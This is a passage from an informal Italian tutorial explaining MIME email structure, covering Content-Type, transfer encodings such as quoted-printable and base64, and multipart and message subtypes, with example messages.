standard di formato per messaggi Internet (leggete mail ma non solo). Quindi con 
l'introduzione di Mime sono stati aggiunti parecchi header di posta relativi 
proprio alla getione dei messaggi MIME-Version come già detto in precedenza è il 
campo che specifica la versione di MIME in uso. E' obbligo introdurre questo 
campo nell'header del messaggio con la seguente sintassi

		MIME-Version: 1.0

Valutato che in futuro potrebbero comparire ulterirori standard oltre a Mime 1 
gli autori della standardizzazione hanno pensato proprio a creare un campo in 
cui si potesse specificare la versione. Nella notazione BNF tutto ciò si traduce 
in

            MIME-Version: = text

Dove "= text" rappresenta un valore che nel precedente caso è "1.0"

E' importante ricordarsi sempre che la specificazione di questo header è 
obbligatoria ma univoca, non ci capiterà mai di trovare più volte riportato 
all'interno del messaggio e lo troveremo sempre prima di tutti gli altri header.



***   Il campo di intestazione Content-Type   ***

Lo scopo del campo Content-Type è di descrivere i dati contenuti nel corpo al fine 
che il client del ricevente (del messaggio) possa scegliere un agente o un 
meccanismo appropriato per presentare i dati all'utente o altrimenti occuparsi 
dei dati in un modo appropriato.

Il campo di intestazione Content-Type è utilizzato per specificare la natura dei 
dati nel corpo di un'entità, dando identificativi di tipo e di sottotipo e 
fornendo informazioni ausiliarie. Dopo i nomi di tipo e di sottotipo, il resto 
del campo di intestazione è semplicemente un insieme di parametri, specificati 
in una notazione di attributo/valore.

L'insieme di parametri significativi è diverso per i vari tipi. Tra i parametri 
definiti un parametro ricorrente è sicuramente "charset" (insieme di caratteri, 
non lo tradurrei hihihihiih è come tradurre directory = direttorio) che serve a 
dichiarare la serie di caratteri utilizzata nel corpo.

Di solito, il Content-Type superiore è utilizzato per dichiarare il tipo 
generale di dati, mentre il sottotipo specifica un formato specifico per quel 
tipo di dati. Così, un Content-Type "image/xyz" è sufficiente per dire che i 
dati sono un'immagine, anche se il client dell'utente non dà alcuna specifica 
sul formato dell'immagine specifica "xyz". 

Tali informazioni possono essere utilizzate, ad esempio, per decidere se 
mostrare i dati non formattati da un sottotipo non riconosciuto a un utente, un 
tale caso potrebbe essere ragionevole per sottotipi non riconosciuti di testo, 
ma non per sottotipi non riconosciuti di immagine o audio. Per questo motivo, i 
sottotipi registrati di audio, immagine, testo e video, non dovrebbero, ripeto 
non dovrebbero (hihihihiihihihih) contenere informazioni incorporate che sono 
realmente di un tipo diverso. Es. tipo immagine file associato eseguibile J I 
tipi così composti dovrebbero essere rappresentati come "application" o 
"multipart", ma lo vedremo più avanti.

I parametri non modificano il  content-subtype e non influiscono sui requisiti 
del sistema host.

Benché la maggior parte dei parametri abbia senso solo con alcuni content-types, 
gli altri sono "global". Ad esempio, il parametro "boundary" ha senso solo per 
il "multipart", ma il parametro "charset" potrebbe avere senso con numerosi 
content-types.

Se un tipo principale deve essere utilizzato in maniera personalizzata per 
qualsiasi motivo, gli deve essere dato un nome che inizia con "X-". Ciò serve a 
indicare il suo stato non-standard ed evitare un conflitto potenziale con un 
nome ufficiale futuro.

Nella notazione BNF di RFC822 il Content-Type viene definito come segue:

            Content-Type := type "/" subtype *[";" parameter]

            type :=    "application"     / "audio"
                      / "image"          / "message"
                      / "multipart"      / "text"
                      / "video"          / x-token

            x-token := < i due caratteri "X-" seguiti senza spazi dal token>

            subtype := token


            parameter := attribute "=" value

            attribute := token

            value := token / quoted-string

            token := 1*<qualsiasi carattere tranne SPACE, CTLs, o tspecials>

            tspecials :=  "(" / ")" / "<" / ">" / "@"  ; 
                       /  "," / ";" / ":" / "\" / <">  ; 
                       /  "/" / "[" / "]" / "?" / "."  ;
                       /  "="                        ; 

Ricordatevi sempre non esiste alcun sottotipo di default.

Il tipo, il sottotipo e i nomi il parametro non sono capsensitive 
maiusc./minusc.. Ad esempio, TEXT, Text e TeXt sono tutto equivalente. I valori 
dei parametri invece sono normalmente sensibili maiusc./minusc..

Oltre questa sintassi, l'unico vincolo sulla definizione di nomi del sottotipo è 
chiedere che l'utilizzo non deve creare conflitti. Questo è vincolato per fare 
in modo che due comunità diverse utilizzino lo stesso sottotipo per scopi 
diversi

	"Content-Type: application/foobar"

Il processo di definire un nuovo content-subtypes, quindi, non ha limitazioni 
imponenti, ma semplicemente un meccanismo per propagandare gli utilizzi. Ci 
sono, quindi, due meccanismi accettabili definendo un nuovo sottotipo Content-
Type:

* Valori privati ( iniziando con " X-" ) può essere definito bilateralmente tra 
due client che collaborano senza registrazione o standardizzazione esterna.

* Nuovi valori da rendere standard devono essere documentati, registrati e 
approvati dallo IANA. 

I sette Content-Types predefiniti standard sono: 

	text -- informazioni testuali. Il sottotipo principale è "plain", indica 
	testo chiaro (non formattato). Nessun software speciale è richiesto per 
	ottenere il significato completo del testo, oltre al supporto per la 
	serie di caratteri indicata. I sottotipi devono essere utilizzati per 
	testo arricchito o formattato da moduli dove un software applicativo può 
	migliorare l'aspetto del testo, ma non deve essere richiesto tale 
	software per ottenere l'idea generale del contenuto. I possibili 
	sottotipi includono così qualsiasi formato di elaboratore testi 
	leggibile. Uno molto semplice e diffuso è il sottotipo richtext.

	multipart -- dati che sono formati da più tipi di dati indipendenti. 
	Sono definiti quattro sottotipi iniziali, tra cui il "mixed", 
	"alternative" per rappresentare gli stessi dati in più formati, 
	"parallel"  e "digest"  per le entità multipart in cui ogni parte è di 
	tipo" message" principale.

	message -- un messaggio incapsulato. Ha i seguenti sotto tipi: il 
	sottotipo principale è "rfc822" secondo proprio la notazione RFC822, 
	"partial" è definito per messaggi parziali per frammentare la spedizione 
	di messaggi troppo grandi, 	"External-body", è definito per la 
	specifica di grandi corpi riferiti a una sorgente dati esterna

	image -- un messaggio immagine. I sottotipi iniziali definiti sono due 
	per formati di immagine widely-used: jpeg e gif.

	audio -- un messaggio audio.
        
	video -- video.Il sottotipo iniziale è "mpeg".

	application -- qualche altro genere di dati, di solito dati binari non 
	interpretabili o informazioni che devono essere elaborate da 
	un'applicazione mail-based. Il sottotipo principale, "octet-stream", 
	deve essere utilizzato nel caso di dati binari che non devono essere 
	interpretati. Ci sono due sottotipi aggiuntivi, "ODA" e "PostScript", 
	essi sono definiti per trasportare documenti ODA e PostScript. 

I messaggi di default RFC 822 sono inseriti da questo protocollo come testo 
chiaro con la serie di caratteri US-ASCII, che può essere specificata 
esplicitamente come: 

	Content-type: text/plain; charset = us-ascii

Nell'assenza di qualsiasi campo di intestazione Content-Type o campo di 
intestazione MIME-Version, è impossibile essere certo che un messaggio è in 
effetti testo nella serie di caratteri US-ASCII. Ad esempio sorge chiaro il 
problema in questo contesto se dovessimo spedire il carattere  che non esiste 
nella tabella US-ASCII

I campi di intestazione Content-Type possono contenere in pratica quasi 
qualsiasi cosa. Quando un lettore di posta incontra un messaggio con un valore 
del Content sconosciuto, dovrebbe generalmente trattarla come equivalente al 
"applicaton/octet-stream", come descritto più avanti in questo tut.



***   Il campo di intestazione Content-Transfer-Encoding   ***

Molti Content-Types che potrebbero essere trasportati per mezzo di posta 
elettronica sono rappresentati, nel loro formato naturale a 8 bit o nei loro 
dati binari. Tali dati non possono essere trasmessi su alcuni protocolli di 
trasporto. Ad esempio, RFC 821 (SMTP server) limita messaggi di posta a dati di 
7 bit US-ASCII con linee di 1000 caratteri.

È necessario, quindi, definire un meccanismo standard per ricodificare tali dati 
in un formato a 7 bit short-line. Tali codifiche saranno indicate da un nuovo 
campo di intestazione "Content-Transfer-Encoding".

Il campo Content-Transfer-Encoding è utilizzato per indicare il tipo di 
trasformazione che è stata utilizzata per rappresentare il corpo in un modo 
accettabile per il trasporto.

Avere una proliferazione di Content-Transfer-Encoding è indesiderabile e non 
necessario. Tuttavia, stabilendo anche un solo meccanismo Content-Transfer-
Encoding non è sufficente. C'è un tradeoff tra il desiderio di una codifica 
compatta ed efficiente di dati largely-binary e il desiderio di una codifica 
leggibile di dati che è prevalentemente a 7 bit. Per questo motivo esistono due 
meccanismi di codifica:

	una codifica "leggibile" e una codifica "densa".

Il campo Content-Transfer-Encoding è progettato per specificare una mappatura 
invertible tra la rappresentazione "nativa" di un tipo di dati e una 
rappresentazione che può essere scambiata prontamente utilizzando protocolli di 
trasporto di posta di 7 bit. Questo campo non è stato definito da nessuno 
standard precedente. Il valore del campo è un singolo token che specifica il 
tipo di codifica, come elencato sotto. 

       Content-Transfer-Encoding: = "BASE64"/"QUOTED-PRINTABLE"/
                                         "8BIT"/"7BIT"/
                                         "BINARY"/x-token

Questi valori non sono capsensitive. Cioè, Base64, BASE64 e bAsE64 sono del 
tutto equivalente. 

Un tipo di codifica 7BIT richiede che il corpo sia già in una rappresentazione a 
sette bit mail-ready. In questo caso è il valore di default è: 

       Content-Transfer-Encoding: 7BIT

"7bit" significa che i dati sono linee brevi del  tutto rappresentate dal 
charset US-ASCII. "8bit" significa che le linee sono brevi, ma ci possono essere 
caratteri non ASCII. "binary" significa che non solo ci sono caratteri non 
ASCII, ma anche che le linee non sono necessariamente abbastanza brevi per 
trasporto SMTP.

La differenza fra "8bit" (o qualsiasi altro token concepibile bit-width) e il 
token "binariy" è che "binariy" non richiede conformità a qualsiasi limite su 
lunghezza di linea o alle semantiche SMTP CRLF, mentre i token bit-width 
richiedono tale conformità.

Se il corpo contiene dati in qualsiasi bit-width diverso da a 7 bit, il bit- 
width appropriato deve essere utilizzato tramite il token Content-Transfer- 
Encoding. Se il corpo contiene dati binari, deve essere utilizzato il token 
"binariy" Content-Transfer- Encoding.


I cinque valori definiti per il Content-Transfer-Encoding non implicano niente 
sul Content-Type diverso dall'algoritmo per cui è stato codificato o dai 
requisiti di sistema di trasporto se unencoded.

A differenza di Content-Types e sottotipi, la creazione di nuovi valori Content-
Transfer-Encoding è esplicitamente e fortemente scoraggiata, come sembra 
probabilmente destinata a impedire l'interoperabilità con piccolo vantaggio 
potenziale. Il loro utilizzo è permesso solo come il risultato di un accordo fra 
client di utenti collaboranti.

Se un campo di intestazione Content-Transfer-Encoding viene visualizzato come 
parte di un'intestazione del messaggio, si applica all'intero corpo di quel 
messaggio. Se un campo di intestazione Content-Transfer-Encoding viene 
visualizzato come parte delle intestazioni di una parte di corpo, si applica 
solo al corpo di quella parte di corpo. Aghhh ..... !!!! 

I meccanismi di codifica spiegati qui codificano esplicitamente tutti i dati in 
ASCII. Così, ad esempio, supponete che un'entità abbia campi di intestazione 
come: 

	Content-Type: text/plain; charset=ISO-8859-1 
	Content-transfer-encoding: base64

questo verrà interpretato come corpo in base64 sapendo che i dati in origine 
erano con un charset ISO-8859-1 e alla fine torneranno tali

Certi valori Content-Transfer-Encoding possono essere utilizzati solo su certi 
Content-Types. In particolare, è impedito appositamente di utilizzare qualsiasi 
codifica diverso da "7bit", "8bit" o "binariy" con qualsiasi Content-Type che 
include ricorsivamente altri campi Content-Type, particolarmente per "multipart" 
e "message". Tutte le codifiche che sono chieste per corpi del tipo multipart o 
messaggio devono essere fatte al livello intimo, codificando il corpo effettivo 
che deve essere codificato.

Le codifiche quoted-printable e base64 sono progettate in modo che la 
conversione tra loro sia possibile. L'unico argomento che risulta in una tale 
conversione è la gestione di linea. Quando si converte da quoted-printable a 
base64 un'interruzione di linea deve essere convertita in una sequenza CRLF. 
Allo stesso modo, una sequenza CRLF in dati base64 dovrebbe essere convertita a 
un'interruzione di linea quoted-printable, ma solo quando convertirete dati di 
testo.



***   Quoted-Printable Content-Transfer-Encoding   ***

La codifica Quoted-Printable è progettata per rappresentare dati che in gran 
parte sono formati da ottetti che corrispondono a caratteri stampabili nella 
serie di caratteri ASCII. Codifica i dati in un modo tale in cui è improbabile 
che gli ottetti che risultano siano modificati durante il trasporto del 
messaggio. Se i dati che vengono codificati somigliano prevalentemente testo 
ASCII, il modulo codificato dei dati rimane in gran parte riconoscibile per 
esseri umani. Un corpo che è completamente ASCII può essere codificato anche in 
Quoted-Printable per assicurare l'integrità dei dati se il messaggio passasse un 
character-translating e/o gateway line-wrapping. (azz se dovessi spiegare anche 
questo ... :) le rfc le hanno scritte in 20 anni e continuano a scriverele).

In questa codifica, gli ottetti devono essere conformi alle seguenti regole:

	* Regola #1: (rappresentazione generale a 8 bit) qualsiasi ottetto, 
	tranne quelli che indicano un'interruzione di linea, può essere 
	rappresentato da uno "=" seguito da una rappresentazione esadecimale di 
	due cifre del valore dell'ottetto. Così, ad esempio, il valore 12 
	(avanzamento pagina ASCII) può essere rappresentato da "=0C" e il valore 
	61 (ASCII EQUAL SIGN) può essere rappresentato da "= 3D". 

	* Regola #2: (rappresentazione letterale) ottetti con valori dal 33 al 
	60 compresi, e da 62 a 126, compresi, sono rappresentati come i 
	caratteri ASCII che corrispondono a quegli ottetti. 

	* Regola #3: (spazio bianco): Ottetti con valori di 9 e di 32 sono  
	rappresentati come caratteri TAB (HT) e SPACE ASCII, rispettivamente, ma 
	non devono essere rappresentati così alla fine di una linea codificata. 
	Qualsiasi carattere TAB (HT) o SPACE su una linea codificata deve essere 
	seguito su quella linea da un carattere stampabile. Ne consegue che un 
	ottetto con il valore 9 o 32 per venire visualizzato alla fine di una 
	linea codificata deve essere rappresentato secondo la regola 1. Questa 
	regola è necessaria a causa di qualche MTAs (messaggio Transport Agents, 
	programmi che trasportano messaggi da un utente a un altro o eseguono 
	una parte di tali trasferimenti), che rimuove igli spazzi alla fine 
	della riga. 

	* Regola #4 (Line Breaks): Un'interruzione di linea in una parte di 
	corpo di testo deve essere rappresentata da un'interruzione di linea 
	(RFC 822), che è una sequenza CRLF, nel Quoted-Encoding stampabile. Se a 
	sequenze isolate CRs e LFs o LF CR e CR LF è permesso di essere 
	visualizzate in dati binari, secondo il modulo canonico, esse devono, 
	comunque, essere rappresentate come insieme di "=0D ", " =0A ", " 
	=0A=0D" e "=0D=0A" rispettivamente.

	* Regola #5 (Soft Line Breaks): La codifica Quoted-Printable richiede 
	che la linea codificata non sia più di lunga di 76 caratteri. Se le 
	linee dovessero essere più lunghe, devono venir utilizzate le 
	interruzioni di linea 'morbide'. Un segno uguale come ultimo carattere 
	su una linea codificata indica che la linea è stata interrotta nel testo 
	codificato. Così ad esempio se dobbiamo codificare la seguente stringa:

		Ora è il tempo perché tutte le genti vengano in aiuto del loro 
		paese.

	questo verrà rappresentato, nella codifica Quoted-Printable, come: 

		Ora è il tempo = tutte le genti vengano = in aiuto del loro 
		paese.

	Sarà poi il client a ripristinare la stringa

	Nel limite di 76 carattere non vengono contati i CRLF e gli "=".

La codifica quoted-printable rappresenta un compromesso fra leggibilità e 
affidabilità in trasporto. 



***   Base64 Content-Transfer-Encoding   ***

Il Base64 Content-Transfer-Encoding è progettato per rappresentare sequenze 
arbitrarie di ottetti in un modulo che non è umanamente leggibile. Gli algoritmi 
di codifica e di decodifica sono semplici, ma i dati codificati sono circa il  
33% più grandi dei dati unencoded. 

Per al codifica in Base64 viene utilizzato un insieme di 65 caratteri di US-
ASCII, permettendo di rappresentare per carattere stampabile i 6 bit. ( essendo 
a 6bit dovremo avere 2 alla 6 combinazioni, 64 in tutto il 65esimo carattere, 
"=", è utilizzato per indicare una funzione di elaborazione speciale ).

Il processo di codifica è rappresentato da gruppi di 24 bit di immissione che 
come output diventano stringhe di 4 caratteri codificati. Continuando da 
sinistra a destra, un gruppo di immissioni a 24 bit è formato concatenando 3 
gruppi di immissioni a 8 bit. 

Questi 24 bit sono quindi trattati prendendo 6 bit alla volta per 4 volte e 
concatenandoli, ognuni gruppo da 6 bit è tradotto in una singola cifra. Nel 
flusso di input Il primo bit sarà il bit high-order nel primo byte e l'ottavo 
bit sarà il bit low-order nel primo byte, e così via.

Ogni gruppo a 6 bit viene utilizzato come indice in un array di 64 caratteri 
stampabili. Il carattere definito dall'indice è messo nella stringa di output. 
Questi caratteri sono identificati secondo l'array di codifica qui di seguito 
riportato.

Array dell'alfabeto Base64

            
                   0 A	 17 R  34 i  51 z
                   1 B	 18 S  35 j  52 0
                   2 C	 19 T  36 k  53 1
                   3 D	 20 U  37 l  54 2
                   4 E	 21 V  38 m  55 3
                   5 F	 22 W  39 n  56 4
                   6 G	 23 X  40 o  57 5
                   7 H	 24 Y  41 p  58 6
                   8 I	 25 Z  42 q  59 7
                   9 J	 26 a  43 r  60 8
                  Il K	 27 b  44 s  61 9
                  11 L	 28 c  45 t  62 +
                  Il M	 29 d  46 u  63 /
                  13 N	 30 e  47 v
                  14 O	 31 f  48 w  (pad) =
                  15 P	 32 g  49 x
                  16 Q	 33 h  50 y

Il flusso di output (byte codificati) deve essere rappresentato in linee di non 
più di 76 caratteri ognuno. Tutte le interruzioni di linea o gli altri caratteri 
non trovati nell'array devono essere ignorati dal software che esegue la 
decodifica. Spesso nei dati base64, caratteri diverso da quelli dell'array, 
interruzioni di linea, spazio bianco indicano un errore di trasmissione.

Sorge spontanea la domanda e se il file da codificare ha un numero di bit non 
divisibile per 24? Molto facile visto che tutto è rappresentato da un numero ben 
preciso di ottetti avremo solo i seguenti casi

	*   l'ultimo gruppo di bit è un multiplo integrale di 24 bit; in questo 
	caso l'unità finale di output sarà pari alla stringa di 4 caratteri come 
	il resto della codifica

	**  L'ultimo gruppo di bit da codificare è esattamente di 8 bit; in 
	questo caso l'unità finale di output codificato sarà pari a 2 caratteri 
	derivati dalla tabella più due caratteri "=" che fungono come caratteri 
	di riempimento

	*** L'ultimo gruppo di bit da codificare è esattamente di 16 bit; in 
	questo caso l'unità finale di output codificato sarà composto da tre 
	caratteri derivati dall'array seguiti da un carattere "=" di  
	riempimento.

Le interruzioni di linea di testo dovrebbero essere convertite in sequenze CRLF 
prima della codifica base64. La cosa importante da notare è che questo può 
essere fatto direttamente dal codificatore piuttosto che in un passo precedente.



***   Campi facoltativi aggiuntivi Content-Header   ***

* Campo di intestazione Content-ID facoltativo

Nella costruzione di un client di posta, può essere desiderabile permettere a un 
corpo di fare riferimento a un altro, di conseguenza, i corpi possono essere 
etichettati utilizzando il campo di intestazione "Content-ID", il quale è 
sintatticamente identico al campo di intestazione "Message-ID":

	Content-ID: = msg-id

Come i valori Message-ID, i valori Content-ID devono essere generati per essere 
i più univoci possibile.

* Campo di intestazione Content-Description facoltativo

La capacità di associare qualche informazione descrittiva a un corpo dato è 
spesso desiderabile. Ad esempio, può essere utile contrassegnare un corpo 
"image" come " un'immagine dello Space Shuttle". Tale testo può essere messo nel 
campo Content-Description

	Content-Description: = *text
            


***   Valori predefiniti del Content-Type 

Riprendiamo in mano i Content-Type e i sette valori precedentemente descritti.

* Text - Content-Type

Text Content-Type è destinato all'invio materiale principalmente testuale. È il 
Content di default. Un parametro "charset" può essere utilizzato per indicare la 
serie di caratteri del testo di corpo. Il sottotipo principale di testo è 
"plain". Questo indica testo chiaro (non formattato). Il Content-Type di default 
per posta Internet è "text/plain"; "charset = us-ascii".

Oltre al testo in chiaro, ci sono molti formati per rappresentare quello che 
potrebbe essere conosciuto come " extended text" (testo con informazioni di 
formattazione e di presentazione incorporate). Una caratteristica interessante 
di tali rappresentazioni è che esse sono in parte leggibili anche senza il 
software che li interpreta. È utile, quindi, distinguerle, a livello più alto, 
da dati così non leggibili come immagini, audio o testo rappresentati in un 
modulo non leggibile. Nell'assenza di software di interpretazione appropriato, è 
ragionevole visualizzare sottotipi di testo all'utente, mentre non è ragionevole 
fare questo con la maggior parte dei dati non testuali.

I dati testuali formattati dovrebbero essere rappresentati come sottotipi di 
testo. I sottotipi plausibili di testo sono di solito dati dal nome comune del 
formato di rappresentazione, per esempio, "text/richtext".

Per promuovere l'interoperabilità più larga di testo formattato semplice, è 
stato definito un sottotipo estremamente semplice di "testo", il sottotipo 
"richtext". Questo sottotipo è stato progettato per soddisfare i seguenti 
criteri:

* Deve essere estremamente semplice analizzare la sintassi, in modo che anche 
sistemi di posta teletype-oriented possano spogliare facilmente via le 
informazioni di formattazione e lasciare solo il testo leggibile.

* La sintassi deve essere estendibile per permettere nuovi comandi di 
formattazione che sono ritenuti essenziali.

La sintassi di "richtext" è molto semplice. Tutti i caratteri si rappresentano 
da soli, con l'eccezione del carattere "<" (ASCII 60), quale è utilizzato per 
contrassegnare l'inizio di un comando di formattazione. Le istruzioni di 
formattazione consistono nel formattare i comandi inclusi tra<> ("<>", ASCII 60 
e 62). Ogni comando di formattazione può essere non più di 40 caratteri in 
lunghezza, tutto in US-ASCII, limitato all'alfanumerico e al trattino (" - "). E 
non mi permetto di descrivere tutti i cmd di richtext, ma comunque è importante 
capire che anche le formattazioni sono fatte con testo in chiaro a differenza 
dei file proprietari di Word o altri strumenti di video scrittura

* Multipart - Content-Type

Nel caso di un messaggio contente un insiemi di dati di vari tipi il campo 
Content-Type "multipart" deve venire inserito nell'intestazione dell'entità. Il 
corpo deve, inoltre, contenere una o più "multipart", ognuna preceduta da un 
limite di incapsulamento e alla fine da un limite finale. 

Una parte di corpo che inizia con una riga vuota è permessa. In un tale caso, 
l'assenza di un campo di intestazione Content-Type implica che l'incapsulamento 
è testo chiaro US-ASCII. Gli unici campi di intestazione che hanno un 
significato definito per parti di corpo sono quelli in cui i nomi iniziano con 
"Content-". Tutti gli altri campi di intestazione devono essere generalmente 
ignorati in parti di corpo.

La distinzione fra un messaggio RFC 822 (SMTP testuale) e una parte di corpo è 
sottile, ma importante. Un gateway tra posta Internet e X.400, ad esempio, deve 
essere in grado di dire la differenza fra una parte di corpo che contiene 
un'immagine e una parte di corpo che contiene un messaggio incapsulato, il cui 
corpo è un'immagine. Per rappresentare l'ultima, la parte di corpo deve avere 

	Content-Type: "messaggio" 

e il suo corpo (dopo la riga vuota) deve essere il messaggio incapsulato, con 
suo proprio "Content-Type":. L'utilizzo di sintassi simile agevola la 
conversione dei messaggi a parti di corpo, e vice versa. 

Come stabilito precedentemente, ogni parte di corpo è preceduta da un limite di 
incapsulamento. Il limite di incapsulamento non viene visualizzato dentro una 
qualunque delle parti incapsulate. Così, è cruciale che il client che compone 
sia in grado di scegliere e specificare il limite univoco che separerà le parti.

Tutti i sottotipi attuali e futuri del tipo "multipart" devono utilizzare una 
sintassi identica. I sottotipi possono essere diversi nella loro semantica ma 
devono conformarsi alla sintassi richiesta per il tipo multipart. Questo 
requisito assicura che tutti i cleint conformi allo standard saranno, almeno, in 
grado di riconoscere e separare le parti di qualsiasi entità multipart, anche di 
un sottotipo non riconosciuto.

Come stabilito nella definizione del campo Content-Transfer-Encoding, una 
codifica diversa da "7bit", "8bit" o "binario" non è permessa per le entità del 
tipo "multipart". I delimitatori multipart e i campi di intestazione sono sempre 
ASCII a 7 bit in ogni caso e i dati all'interno delle parti di corpo possono 
essere codificati su una base part-by-part, con campi Content-Transfer-Encoding 
per ogni parte di corpo appropriata.

Si sa comunemente che gateway di posta, smistamenti e altri agenti di gestione 
di posta modificano l'intestazione superiore di un messaggio RFC 822 (se vi 
ricordate il precedente tut riguardo ai recived). In particolari, essi 
aggiungono frequentemente, rimuovono o riordinano campi di intestazione. Tali 
modifiche sono proibite esplicitamente per le intestazioni di parte del corpo 
incorporate nei corpi di messaggi del tipo "multipart".

	* Multipart: La sintassi comune

	Tutti i sottotipi di "multipart" condividono una sintassi comune

	Il campo Content-Type per le entità multipart richiede un parametro, 
	"boundary ", utilizzato per specificare il limite di incapsulamento. 


	Così, un campo di intestazione multipart Content-Type tipico potrebbe 
	assomigliare a questo:

                 Content-Type: multipart/mixed;
                      boundary=gc0p4Jq0M2Yt08jU534c0p

	Questo indica che l'entità stessa è formata da numerose parti, ognuna 
	con una struttura che è sintatticamente identica a un messaggio RFC 822, 
	salvo che l'area di intestazione potrebbe essere completamente vuota e 
	che le parti sono precedute ognuno dalla linea

                 --gc0p4Jq0M2Yt08jU534c0p

	I limiti di incapsulamento non devono venire visualizzati all'interno 
	degli incapsulamenti e devono essere non più di 70 caratteri, non 
	contando i due trattini iniziali.

	Il limite di incapsulamento che segue l'ultima parte di corpo è un 
	delimitatore distinto che indica che nessuna ulteriore parte di corpo 
	seguirà. Un tale delimitatore è identico ai delimitatori precedenti, con 
	l'aggiunta di altri due trattini alla fine della linea:

                 --gc0p4Jq0M2Yt08jU534c0p--

	Guardiamo un esempio di messaggio con un Content-type multipart composto 
	da 2 testi in asciii

                 From: roxyyy <royyy@libero.it>
                 To: Multiways <multiways@libero.it>
                 Subject: Messaggio prova
                 MIME-Version: 1.0
                 Content-type: multipart/mixed; boundary="simple
                 		boundary"

                 --simple boundary

                 Questo è testo in chiaro immesso implicitamente.
                 Non finisce con un line break.
                 --simple boundary
                 Content-type: text/plain; charset=us-ascii

                 Questo è testo chiaro immesso esplicitamente.
                 Viene terminano con un linebreak.

                 --simple boundary--

	Se ripescate con outlook vecchie mail con attach o immagini, vi 
	renderete conto della sintassi e della struttura del messaggio ricevuto. 
	L'utilizzo di un Content-Type di multipart in una parte di corpo 
	all'interno di un'altra entità multipart è permesso esplicitamente. In 
	tali casi, per cause evidenti, l'attenzione deve essere presa per 
	assicurare che ogni entità annidata multipart deve utilizzare un 
	delimitatore di limite diverso. 

	L'unico parametro obbligatorio per il multipart Content-Type è il 
	parametro di boundary. (Se per caso sembra che un limite termini con 
	spazio bianco, lo spazio bianco deve essere essere cancellato perché 
	aggiunto da un gateway). È specificato formalmente dal seguente BNF:

            boundary: = 0*69<bchars> bcharsnospace

            bchars: = bcharsnospace/""

            bcharsnospace: = DIGIT/ALPHA/"'"/"("/")"/" + "/
            "_"
                           []/"", / " - "/"". []/"/"/": "/" = "/""?

	Complessivamente, il corpo di un'entità multipart può essere specificata 
	come segue, seguendo la notazione BNF:

	    multipart-body := preamble 1*encapsulation
                              close-delimiter epilogue
            encapsulation := delimiter CRLF body-part

            delimiter := CRLF "--" boundary   
                                           
            close-delimiter := delimiter "--" 

            preamble :=  *text                  

            epilogue :=  *text                  

            body-part = <"message">


        * Sottotipo (principale) The Multipart/mixed

        Il sottotipo principale per multipart, "mixed", è utilizzato quando le 
        parti di corpo sono indipendenti. 

        * Sottotipo Multipart/alternative

        Il multipart/alternative è sintatticamente identico a multipart/mixed, 
        ma le semantiche sono diverse. In particolare, ognuna delle parti è una 
        versione "alternativa" delle stesse informazioni. I client dovrebbero 
        riconoscere che il contenuto delle diverse parti è intercambiabile. Il 
        client dovrebbe scegliere il "meglio" che il tipo ha basato 
        sull'ambiente e sulle preferenze o sull'offerta dell'utente. 

        Questo può essere utilizzato, ad esempio, per inviare posta in un 
        formato di testo personalizzato in modo tale in cui può essere 
        facilmente visualizzato da chiunque:

		From: roxyyyy <roxyyy@libero.it>             
		To: Multiways <multiways@libero.it>
		Subject: testo formattato 
		MIME-Version: 1.0 
		Content-Type: multipart/alternative; boundary=boundary42


            	--boundary42
            	Content-Type: text/plain; charset=us-ascii

            	...testo non formattato....

            	--boundary42
            	Content-Type: text/richtext

            	....stesso messaggio in rechtext...
            	--boundary42
            	Content-Type: text/x-whatever

            	....testo formattato con uno stile non standard...
            	--boundary42--

        In questo esempio, alcuni client mostrerebbero il testo in x-whatever, 
        altri in richtext ed infine in testo non formattato

	Di solito, i client che compongono multipart/alternative dovrebbero 
	mettere le parti di corpo in ordine crescente di preferenza dal basso 
	verso l'alto. 

	* Sottotipo Multipart/digest

        Moh definiamo un sottotipo "di compendio" del multipart Content-Type. 
        Questo tipo è sintatticamente identico a multipart/mixed, ma le 
        semantiche sono diverse. In particolare, in un digest, il valore di 
        default Content-Type per una parte di corpo viene modificato da 
        "testo/plain". Questo è fatto per permettere un formato di compendio più 
        leggibile e che sia in gran parte compatibile.

        Faccio il solito esempio della sintassi per rendere più semplice la 
        comprensione:

            From: roxyyy@libero.it
            MIME-Version: 1.0
            Subject:  prova Digest
            Content-Type: multipart/digest;
                 boundary="---- next message ----"


            ------ next message ----

            From: multiways@libero.it
            Subject: azz che @@ a formattare sto testo

            ...corpo del messaggio...

            ------ next message ----

            From: mephino@email.it
            Subject: come è stato scrivere la guida?

            ...altro corpo del messaggio...

            ------ next message ------

	Avete presente i messaggi di replay possono essere multipart/digest

* Message - Content-Type

È frequentemente desiderabile, nell'invio di posta, incapsulare un altro 
messaggio di posta. Per questa operazione comune, è definito uno speciale 
Content-Type, "message". 

Comporre messaggi di rifiuto e di invio in questo modo preserverà le 
informazioni di tipo sul messaggio originale e permetterà di presentare 
correttamente esso al destinatario ed è perciò fortemente consigliato.

Come stabilito nella definizione del campo Content-Transfer-Encoding, non si può 
codificare in maniera diversa da "7bit", "8bit" o "binario" messaggi o parti di 
tipo "message". I campi di intestazione di message sono sempre US-ASCII in ogni 
caso e i dati all'interno del corpo possono essere ancora codificati.            

	* Sottotipo (principale) Message/rfc822

        Un Content-Type "message/rfc822" indica che il corpo contiene un 
        messaggio incapsulato, con la sintassi RFC822.

        * Sottotipo Message/Partial

        Un sottotipo di messaggio, "partial", è definito per permettere a grandi 
        oggetti di essere consegnati fragmentati per poi essere riassemblati dal 
        client. (il concetto è simile a frammentazione IP/reassembly 
        nell'Internet Protocols di base). Questo meccanismo può essere 
        utilizzato quando gli agenti di trasporto intermedi limitano la 
        dimensione di singoli messaggi che possono essere inviati. Content-Type 
        "Message/Partial" indica così che il corpo contiene un frammento di un 
        messaggio più grande.

	Tre parametri devono essere specificati nel campo Content-Type di tipo 
	Message/Partial: 

	Il primo, "id", è identificativo univoco da utilizzare per far 
	corrispondere asseieme le parti. (di solito, l'identificativo è 
	essenzialmente un message-id); se messo in virgolette doppie, può essere 
	qualsiasi message-id. Il secondo, "number", un intero, è il numero 
	parte, che indica dove questa parte va inserita nella sequenza di 
	frammenti. Il terzo, "total", un altro intero, è il numero totale di 
	parti. Questo terzo sottocampo è richiesto sulla parte finale ed è 
	facoltativo sulle parti precedenti. Questi parametri possono essere dati 
	in qualsiasi ordine.

        Così, la parte 2 di un messaggio di 3 parti può avere l'uno o l'altro 
        dei seguenti campi di intestazione:

    
                 Content-Type: Message/Partial;
                      number=2; total=3;
                      id="oc=jpbe0M2Yt4s@libero.it";

                 Content-Type: Message/Partial;
                      id="oc=jpbe0M2Yt4s@libero.it";
                      number=2

